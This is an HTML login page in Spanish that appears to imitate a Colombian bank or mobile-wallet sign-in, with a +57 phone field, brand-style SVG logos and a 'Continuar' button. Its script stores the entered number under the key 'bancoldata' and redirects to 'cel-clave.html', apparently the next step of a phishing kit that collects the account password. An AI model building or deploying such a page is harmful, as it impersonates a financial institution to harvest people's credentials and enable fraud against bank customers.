<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Ingreso</title>

<style>
body{
  margin:0;
  font-family: Arial, sans-serif;
  background:#21003d;
  display:flex;
  justify-content:center;
}

/* CONTENEDOR */
.container{
  width:100%;
  max-width:420px;
  min-height:100vh;
  display:flex;
  flex-direction:column;
  padding:20px;
  color:white;
  animation:fadeIn .5s ease;
}

/* HEADER */
header{
  display:flex;
  justify-content:space-between;
  align-items:center;
}

.circle{
  width:22px;
  height:22px;
  border:2px solid white;
  border-radius:50%;
  display:flex;
  justify-content:center;
  align-items:center;
  font-size:14px;
}

/* LOGO CENTRO */
.logo{
  margin-top:auto;
  display:flex;
  justify-content:center;
  align-items:center;
  margin-bottom:40px;
  animation:fadeIn 0.8s ease;
}

/* FORM */
.form-box{
  margin-top:auto;
}

.input-box{
  display:flex;
  background:rgba(255,255,255,0.15);
  border-radius:6px;
  overflow:hidden;
  transition:.3s;
}

.input-box:focus-within{
  background:rgba(255,255,255,0.25);
}

.prefix{
  padding:12px;
  border-right:2px solid #21003d;
  color:#ff4fc3;
  font-weight:bold;
}

input{
  flex:1;
  padding:12px;
  border:none;
  background:transparent;
  color:white;
  font-size:18px;
  outline:none;
}

input::placeholder{
  color:#ddd;
}

/* BOTON */
button{
  width:100%;
  margin-top:12px;
  padding:14px;
  border:none;
  border-radius:6px;
  background:#ff008c;
  color:white;
  font-size:16px;
  cursor:pointer;
  transition:.3s;
}

button:disabled{
  opacity:0.4;
}

button:active{
  transform:scale(0.96);
}

/* LOADER */
.loader{
  position:fixed;
  inset:0;
  background:#21003d;
  display:flex;
  justify-content:center;
  align-items:center;
  opacity:0;
  pointer-events:none;
  transition:.4s;
}

.loader.active{
  opacity:1;
  pointer-events:all;
}

.spinner{
  width:40px;
  height:40px;
  border:4px solid rgba(255,255,255,0.2);
  border-top:4px solid #ff008c;
  border-radius:50%;
  animation:spin 1s linear infinite;
}

@keyframes spin{
  to{transform:rotate(360deg);}
}

@keyframes fadeIn{
  from{opacity:0; transform:translateY(10px);}
  to{opacity:1; transform:translateY(0);}
}
</style>
</head>

<body>

<div class="container">

<!-- HEADER -->
<header>
  <div class="circle">?</div>

  <div style="color:#aaa;">
    <svg width="70" height="24" viewBox="0 0 118 40" fill="currentColor">
      <g>
        <path d="M83.59,23.13..."></path>
      </g>
    </svg>
  </div>
</header>

<!-- LOGO CENTRAL -->
<div class="logo">
  <svg width="180" height="40" viewBox="0 0 104 32" fill="none">
    <path d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081"/>
    <path d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="white"/>
  </svg>
</div>

<!-- FORM -->
<div class="form-box">

<div class="input-box">
  <div class="prefix">+57</div>
  <input 
    type="tel" 
    id="phone" 
    inputmode="numeric"
    placeholder="Ingresa tu cel"
    maxlength="12">
</div>

<button id="btn" disabled>Continuar</button>

</div>

</div>

<!-- LOADER -->
<div class="loader" id="loader">
  <div class="spinner"></div>
</div>

<script>
const phone = document.getElementById("phone");
const btn = document.getElementById("btn");
const loader = document.getElementById("loader");

/* FORMATO */
function formatNumber(value){
  let digits = value.replace(/\D/g,"");

  if(digits.length > 10) digits = digits.slice(0,10);

  if(digits.length > 6){
    return digits.replace(/(\d{3})(\d{3})(\d{0,4})/, "$1 $2 $3");
  }else if(digits.length > 3){
    return digits.replace(/(\d{3})(\d{0,3})/, "$1 $2");
  }
  return digits;
}

/* VALIDACION */
function validate(){
  const digits = phone.value.replace(/\D/g,"");
  return digits.length === 10 && digits.startsWith("3");
}

/* INPUT */
phone.addEventListener("input", ()=>{
  phone.value = formatNumber(phone.value);
  btn.disabled = !validate();
});

/* CLICK */
btn.addEventListener("click", ()=>{
  if(!validate()) return;

  if(navigator.vibrate) navigator.vibrate(50);

  const raw = phone.value.replace(/\D/g,"");

  localStorage.setItem("bancoldata", JSON.stringify({
    telefono: raw,
    fecha: new Date().toISOString()
  }));

  loader.classList.add("active");

  setTimeout(()=>{
    window.location.href = "cel-clave.html";
  },1200);
});
</script>

</body>
</html>
